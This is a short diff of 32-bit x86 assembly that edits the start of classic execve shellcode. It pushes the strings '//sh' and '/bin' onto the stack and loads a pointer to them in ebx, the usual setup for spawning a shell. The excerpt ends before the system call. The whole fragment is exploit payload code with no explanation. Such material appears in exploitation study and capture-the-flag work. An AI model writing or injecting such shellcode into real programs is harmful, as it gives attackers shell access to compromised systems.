@@ -1,7 +1,8 @@
+bits 32
 xor eax, eax
-push DWORD eax
+push eax
 push 0x68732f2f
-push 0x6e69622f
+push DWORD 0x6e69622f
 mov ebx, esp
 push eax
 push ebx
